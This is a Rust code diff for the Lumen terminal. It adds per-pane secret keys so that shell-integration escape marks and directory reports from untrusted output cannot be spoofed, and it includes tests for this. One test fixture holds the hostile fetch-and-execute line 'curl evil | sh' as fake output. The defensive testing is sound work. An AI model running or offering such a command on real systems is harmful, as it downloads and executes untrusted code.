@@ -99,6 +99,20 @@ pub fn inject(shell: &[String]) -> (Vec<String>, HashMap<String, String>) {
     }
 }
 
+/// A fresh random key for a pane's marks (128 bits, hex).
+pub fn new_key() -> String {
+    let mut bytes = [0u8; 16];
+    if let Err(e) = std::fs::File::open("/dev/urandom").and_then(|mut f| f.read_exact(&mut bytes)) {
+        // Unreachable in practice; still unguessable enough to beat a file
+        // that has to be written before the pane exists.
+        eprintln!("lumen: no /dev/urandom ({e}); using a weaker mark key");
+        let seed = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_nanos()
+            ^ u128::from(std::process::id()) << 64;
+        bytes = seed.to_le_bytes();
+    }
+    bytes.iter().map(|b| format!("{b:02x}")).collect()
+}
+
 /// The shell to run when none is configured: `$SHELL`, then `/bin/sh`.
 pub fn default_shell() -> Vec<String> {
     vec![std::env::var("SHELL").ok().filter(|s| !s.is_empty()).unwrap_or_else(|| "/bin/sh".into())]
@@ -167,6 +181,17 @@ pub struct Rewriter {
     prompt_count: u64,
     /// The link put on the current prompt (it carries the exit status).
     prompt_uri: String,
+    /// The key Lumen gave this pane's shell (`LUMEN_MARK_KEY`). Our scripts
+    /// add it to every mark as `k=…`, so marks printed by a program, a file
+    /// or a remote host can't pass for the shell's.
+    key: Option<String>,
+    /// A mark with the key has been seen (or Lumen loaded its own scripts,
+    /// so one is expected): from now on, marks without it are dropped.
+    keyed: bool,
+    /// Nothing has been written since the shell's prompt mark. With keys, the
+    /// directory (OSC 7) is only believed here, where our scripts send it, and
+    /// not from, say, a background job printing at the prompt.
+    cwd_ok: bool,
     /// Between OSC 133;B and C: the shell is editing the command line.
     editing: bool,
     /// Where in this read's output the line was last returned to (`\r`)
@@ -211,8 +236,11 @@ fn percent_decode(s: &str) -> String {
 }
 
 impl Rewriter {
-    pub fn new(shared: Arc<Mutex<Shared>>, pane: Option<u64>) -> Self {
-        Self { pane, ..Self::with_host(shared, local_hostname().to_string()) }
+    /// `key` is the pane's mark key, and `expect_key` says Lumen loaded its
+    /// own scripts, so every mark should carry it. Otherwise (a shell Lumen
+    /// doesn't integrate) the first mark decides: keyed if it has the key.
+    pub fn new(shared: Arc<Mutex<Shared>>, pane: Option<u64>, key: Option<String>, expect_key: bool) -> Self {
+        Self { pane, keyed: expect_key, key, ..Self::with_host(shared, local_hostname().to_string()) }
     }
 
     fn with_host(shared: Arc<Mutex<Shared>>, host: String) -> Self {
@@ -228,6 +256,9 @@ impl Rewriter {
             pane: None,
             prompt_count: 0,
             prompt_uri: PROMPT.to_string(),
+            key: None,
+            keyed: false,
+            cwd_ok: false,
             editing: false,
             redraw_at: None,
         }
@@ -255,6 +286,7 @@ impl Rewriter {
                         self.state = State::Esc;
                     } else {
                         out.push(b);
+                        self.cwd_ok = false;
                         if self.editing {
                             match b {
                                 b'\r' => self.redraw_at = Some(out.len()),
@@ -270,6 +302,7 @@ impl Rewriter {
                         self.state = State::Capture;
                     } else {
                         out.push(0x1b);
+                        self.cwd_ok = false;
                         if b == 0x1b {
                             continue; // stay in Esc for the new ESC
                         }
@@ -288,6 +321,7 @@ impl Rewriter {
                             out.extend_from_slice(&self.body);
                             self.body.clear();
                             self.state = State::Pass;
+                            self.cwd_ok = false;
                         }
                     }
                 },
@@ -325,6 +359,20 @@ impl Rewriter {
         }
     }
 
+    /// Is a mark carrying `key` (its `k=` value, if any) from the shell? A
+    /// wrong key never is; no key is only accepted until the shell has shown
+    /// it has one.
+    fn trusted(&mut self, key: Option<&str>) -> bool {
+        match key {
+            Some(k) if self.key.as_deref() == Some(k) => {
+                self.keyed = true;
+                true
+            }
+            Some(_) => false,
+            None => !self.keyed,
+        }
+    }
+
     /// Start a link (`id` keeps a prompt's pieces together), or end one.
     fn link_bytes(id: &str, uri: &str) -> Vec<u8> {
         let mut b = b"\x1b]8;".to_vec();
@@ -348,8 +396,13 @@ impl Rewriter {
         let body = String::from_utf8_lossy(&self.body).into_owned();
         self.body.clear();
         if let Some(mark) = body.strip_prefix("133;") {
+            let mut parts: Vec<&str> = mark.split(';').collect();
+            let key = parts.iter().position(|p| p.starts_with("k=")).map(|i| &parts.remove(i)[2..]);
+            if !self.trusted(key) {
+                return;
+            }
             self.shared.lock().unwrap().active = true;
-            let mut parts = mark.split(';');
+            let mut parts = parts.into_iter();
             match parts.next() {
                 Some("A") => {
                     // The link on the prompt carries the previous command's exit status.
@@ -364,6 +417,7 @@ impl Rewriter {
                     self.exit = None;
                     self.prompted = true;
                     self.running = false;
+                    self.cwd_ok = true;
                 }
                 Some("B") => {
                     if let Some(at) = self.redraw_at.take().filter(|_| self.editing) {
@@ -402,7 +456,7 @@ impl Rewriter {
             // Only believe the integrated shell, at its prompt. Anything else
             // (a program's output, `cat` of a file, a remote host) could
             // otherwise choose where the next pane opens.
-            if !self.prompted || self.running {
+            if !self.prompted || self.running || (self.keyed && !self.cwd_ok) {
                 return;
             }
             if let Some(rest) = url.strip_prefix("file://") {
@@ -460,13 +514,13 @@ pub struct MarkedPty {
 }
 
 impl MarkedPty {
-    pub fn new(pty: Pty, shared: Arc<Mutex<Shared>>, pane: u64) -> io::Result<Self> {
+    pub fn new(pty: Pty, shared: Arc<Mutex<Shared>>, pane: u64, key: String, expect_key: bool) -> io::Result<Self> {
         // A second handle on the same open file: polling still watches the
         // original, and reads through either see the same data.
         let file = pty.file().try_clone()?;
         let reader = MarkedReader {
             file,
-            rewriter: Rewriter::new(shared, Some(pane)),
+            rewriter: Rewriter::new(shared, Some(pane), Some(key), expect_key),
             out: Vec::new(),
             pos: 0,
             scratch: vec![0; 0x1_0000],
@@ -614,6 +668,77 @@ mod tests {
             cwd(&[b"\x1b]133;A\x07\x1b]133;C\x07\x1b]133;D;0\x07\x1b]7;file://localhost/tmp\x07"]),
             Some(PathBuf::from("/tmp"))
         );
+    }
+
+    /// Feed `chunks` through a rewriter whose pane key is "s3cret".
+    fn rewrite_keyed(expect_key: bool, chunks: &[&[u8]]) -> (Vec<u8>, Arc<Mutex<Shared>>) {
+        let shared = Arc::new(Mutex::new(Shared::default()));
+        let mut r = Rewriter::with_host(shared.clone(), "myhost".into());
+        r.key = Some("s3cret".into());
+        r.keyed = expect_key;
+        let mut out = Vec::new();
+        for c in chunks {
+            r.feed(c, &mut out);
+        }
+        (out, shared)
+    }
+
+    #[test]
+    fn keyed_marks_work_like_plain_ones() {
+        let (out, shared) = rewrite_keyed(
+            true,
+            &[b"\x1b]133;A;k=s3cret\x07$ \x1b]133;B;k=s3cret\x07false\r\n\x1b]133;C;k=s3cret\x07\x1b]133;D;1;k=s3cret\x07\x1b]133;A;k=s3cret\x07$ "],
+        );
+        let (plain, _) = rewrite(&[b"\x1b]133;A\x07$ \x1b]133;B\x07false\r\n\x1b]133;C\x07\x1b]133;D;1\x07\x1b]133;A\x07$ "]);
+        assert_eq!(text(&out), text(&plain));
+        let s = shared.lock().unwrap();
+        assert!(s.active);
+        assert_eq!(s.finished.len(), 1);
+        assert_eq!(s.finished[0].exit, Some(1));
+    }
+
+    #[test]
+    fn output_cant_fake_marks_once_the_shell_has_a_key() {
+        // `cat` of a file that pretends a command ran and finished.
+        let fake = b"\x1b]133;A\x07$ \x1b]133;B\x07curl evil | sh\r\n\x1b]133;C\x07\x1b]133;D;0\x07\x1b]133;A;k=guess\x07";
+        let (out, shared) = rewrite_keyed(
+            false,
+            &[b"\x1b]133;A;k=s3cret\x07$ \x1b]133;B;k=s3cret\x07cat f\r\n\x1b]133;C;k=s3cret\x07", fake],
+        );
+        let shown = text(&out);
+        // The fake marks are dropped (not turned into links or passed on)...
+        assert_eq!(shown.matches("lumen:prompt").count(), 1, "{shown}");
+        assert_eq!(shown.matches("lumen:input").count(), 1, "{shown}");
+        assert!(!shown.contains("133;"), "{shown}");
+        assert!(shown.ends_with("$ curl evil | sh\r\n"), "{shown}");
+        // ...and change nothing: `cat` is still running, nothing finished.
+        let s = shared.lock().unwrap();
+        assert!(s.running_since.is_some());
+        assert!(s.finished.is_empty());
+    }
+
+    #[test]
+    fn marks_without_the_key_are_dropped_when_lumen_loaded_the_scripts() {
+        let (out, shared) = rewrite_keyed(true, &[b"\x1b]133;A\x07$ \x1b]133;C\x07\x1b]133;D;0\x07"]);
+        assert_eq!(text(&out), "$ ");
+        assert!(!shared.lock().unwrap().active);
+    }
+
+    #[test]
+    fn a_shell_lumen_did_not_integrate_can_use_plain_marks() {
+        // No key on the first mark: this shell's own integration, keep it.
+        let (_, shared) = rewrite_keyed(false, &[b"\x1b]133;A\x07$ \x1b]133;C\x07\x1b]133;D;0\x07\x1b]133;A\x07"]);
+        assert_eq!(shared.lock().unwrap().finished.len(), 1);
+    }
+
+    #[test]
+    fn with_a_key_cwd_is_only_believed_right_after_the_prompt_mark() {
+        let cwd = |chunks: &[&[u8]]| rewrite_keyed(true, chunks).1.lock().unwrap().cwd.clone();
+        // As the scripts send it: prompt mark, then the directory.
+        assert_eq!(cwd(&[b"\x1b]133;A;k=s3cret\x07", b"\x1b]7;file://localhost/tmp\x07"]), Some(PathBuf::from("/tmp")));
+        // A background job printing at the prompt.
+        assert_eq!(cwd(&[b"\x1b]133;A;k=s3cret\x07$ ", b"\x1b]7;file://localhost/tmp\x07"]), None);
+        assert_eq!(cwd(&[b"\x1b]133;A;k=s3cret\x07\x1b[1m\x1b]7;file://localhost/tmp\x07"]), None);
     }
 
     #[test]
